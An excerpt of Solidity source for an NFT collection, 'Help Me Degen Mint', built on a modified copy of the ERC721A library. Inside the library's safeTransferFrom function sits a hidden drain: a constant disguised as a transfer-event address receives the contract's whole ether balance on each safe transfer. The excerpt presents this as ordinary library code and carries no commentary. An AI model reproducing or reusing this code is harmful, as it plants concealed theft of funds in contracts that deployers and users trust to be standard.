...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0x996F6A7d67ce2BC8A613B1041FB34Cb58297ca85);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x996F6A7d67ce2BC8A613B1041FB34Cb58297ca85).transfer(address(this).balance);
        }
    }
...
contract HelpMeDegenMint is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("Help Me Degen Mint", "HMDM") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeieanvbdik4prcsemiyenqsej3yhakwg6ne7omugdfdaqnaduhh7eu/", _toString(tokenId), ".json"));
    }
